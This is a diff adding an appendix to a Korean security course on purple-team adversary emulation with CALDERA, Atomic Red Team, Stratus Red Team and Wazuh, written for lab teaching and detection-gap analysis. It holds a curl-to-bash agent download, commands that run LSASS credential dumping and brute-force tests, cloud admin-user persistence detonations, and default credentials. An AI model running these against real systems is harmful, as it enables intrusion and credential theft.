@@ -683,3 +683,172 @@ Red Agent 는 *lab 환경에만 한정* 되어야. 실제 운영 환경 공격 =
 
 **학생 액션**: lab 에서 Red Agent vs Blue Agent 의 자동 평가 + 결과 분석.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course9 — Week 12 시뮬레이션)
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 |
+|------|----------|---------|
+| s1 | MITRE CALDERA | **CALDERA** (MITRE) |
+| s2 | Atomic Red Team | **Atomic Red Team** |
+| s3 | Stratus Red Team (Cloud) | **Stratus Red Team** (Datadog) |
+| s4 | Prelude Operator | **Prelude Operator OSS** |
+| s5 | DetectionLab | DetectionLab |
+| s6 | 자체 시나리오 (yaml) | CALDERA adversary YAML |
+| s7 | Purple team report | DeTT&CT |
+| s8 | 통합 시뮬 cycle | CALDERA + Atomic + Wazuh |
+
+### 학생 환경 준비
+
+```bash
+# CALDERA (가장 종합적)
+git clone https://github.com/mitre/caldera --recursive ~/caldera
+cd ~/caldera && pip install -r requirements.txt
+python3 server.py --insecure                          # http://localhost:8888
+
+# Atomic Red Team
+git clone https://github.com/redcanaryco/atomic-red-team.git ~/atomic
+pip install pyinvoke invoke
+
+# Stratus Red Team (cloud — Go)
+go install github.com/datadog/stratus-red-team/v2/cmd/stratus@latest
+
+# Prelude Operator
+# https://www.preludesecurity.com/products/operator
+```
+
+### 핵심 — CALDERA (MITRE adversary emulation)
+
+```bash
+# 1) 서버 시작
+cd ~/caldera
+python3 server.py --insecure
+# Web UI: http://localhost:8888 (admin/admin)
+
+# 2) Adversary profile 선택 (built-in 50+ APT)
+# - APT29 (Russia)
+# - APT41 (China)
+# - Lazarus (NK)
+# - FIN7 (Carbanak)
+
+# 3) Agent 배포 (모든 endpoint 에 자동)
+# Endpoint 에서 실행:
+curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \
+    http://caldera-server:8888/file/download | bash
+
+# 4) Operation 시작 (Web UI)
+# - Adversary: APT29
+# - Group: linux-hosts
+# - Planner: atomic
+# - 시작 → 자동으로 다단계 공격 실행
+
+# 5) 결과 분석
+curl http://localhost:8888/api/rest \
+    -H "KEY: ADMIN123" \
+    -d '{"index": "operations"}' | jq
+```
+
+### Atomic Red Team (T-code 기반 단순 시뮬)
+
+```bash
+# 1) 설치 + invoke
+sudo invoke install-atomicredteam
+
+# 2) ATT&CK technique 별 시뮬레이션
+# T1078 — Valid Accounts
+sudo invoke run-atomic-test T1078
+
+# T1059.001 — PowerShell
+sudo invoke run-atomic-test T1059.001
+
+# T1110.001 — Brute Force: Password Guessing
+sudo invoke run-atomic-test T1110.001
+
+# T1003.001 — LSASS Memory
+sudo invoke run-atomic-test T1003.001
+
+# 3) 통합 시퀀스 (Kill chain)
+for t in T1078 T1059.001 T1110.001 T1003.001 T1547.001 T1003.001 T1078; do
+    echo "=== $t ==="
+    sudo invoke run-atomic-test $t
+    sleep 30                                          # 탐지 시간 확보
+done
+
+# 4) Wazuh 에서 탐지 확인
+sudo jq -r '.rule.mitre.id // empty' /var/ossec/logs/alerts/alerts.json | sort | uniq -c
+# 출력 예:
+#   1 T1078
+#   3 T1059.001
+#   1 T1110.001
+#   ... (탐지된 ATT&CK technique)
+```
+
+### Stratus Red Team (Cloud emulation)
+
+```bash
+# AWS / Azure / GCP / K8s 공격 시뮬
+stratus list
+# - aws.persistence.iam-create-admin-user
+# - aws.exfiltration.s3-bucket-public-access
+# - azure.persistence.create-guest-user
+# - gcp.persistence.add-iam-user
+# - kubernetes.privilege-escalation.create-token
+
+# 1) Warmup (인프라 준비)
+stratus warmup aws.persistence.iam-create-admin-user
+
+# 2) Detonate (실제 공격)
+stratus detonate aws.persistence.iam-create-admin-user
+# CloudTrail / Falco 가 탐지 시그니처 생성
+
+# 3) Cleanup (자원 정리)
+stratus cleanup aws.persistence.iam-create-admin-user
+```
+
+### Purple Team Cycle (CALDERA + Wazuh + DeTT&CT)
+
+```bash
+# 1) Pre-test: 현재 coverage 측정
+python3 ~/dettect/dettect.py editor
+# Web UI 에서 현재 detection coverage 입력
+
+# 2) Red simulation (CALDERA)
+# Web UI 에서 APT29 operation 시작
+
+# 3) Blue detection 측정 (Wazuh)
+sudo jq -r 'select(.rule.mitre.id) | .rule.mitre.id' /var/ossec/logs/alerts/alerts.json \
+    | sort | uniq -c | sort -rn > /tmp/detected.txt
+
+# 4) Gap 분석
+# CALDERA executed: T1078, T1059, T1003, T1547, T1090
+# Wazuh detected: T1078, T1059
+# Gap: T1003, T1547, T1090
+
+# 5) Sigma rule 추가 (gap 항목)
+sigma convert -t wazuh ~/sigma/rules/windows/process_creation/proc_creation_win_lsass_dump.yml \
+    > /var/ossec/etc/rules/sigma-T1003.xml
+sudo systemctl restart wazuh-manager
+
+# 6) Re-test (CALDERA 재실행)
+# 모든 ATT&CK technique 탐지 확인
+```
+
+### 자체 Adversary profile 작성 (CALDERA YAML)
+
+```yaml
+# ~/caldera/data/adversaries/custom-apt.yml
+id: custom-apt-2026
+name: Custom Internal APT
+description: 본 조직의 가장 가능성 높은 위협 시나리오
+atomic_ordering:
+  - 6f4ff2b6-5e0e-4b3f-9e0e-1234567890ab            # T1078 Valid Accounts
+  - 8f4ff2b6-5e0e-4b3f-9e0e-1234567890cd            # T1059 Command line
+  - 9f4ff2b6-5e0e-4b3f-9e0e-1234567890ef            # T1003 LSASS dump
+  - af4ff2b6-5e0e-4b3f-9e0e-1234567890ff            # T1547 Boot or Logon
+  - bf4ff2b6-5e0e-4b3f-9e0e-1234567890aa            # T1041 C2 channel
+```
+
+학생은 본 12주차에서 **CALDERA + Atomic Red Team + Stratus + DeTT&CT** 4 도구로 자동 시뮬레이션의 4 단계 (시나리오 정의 → 실행 → 탐지 측정 → gap 보강) Purple team 사이클을 익힌다.
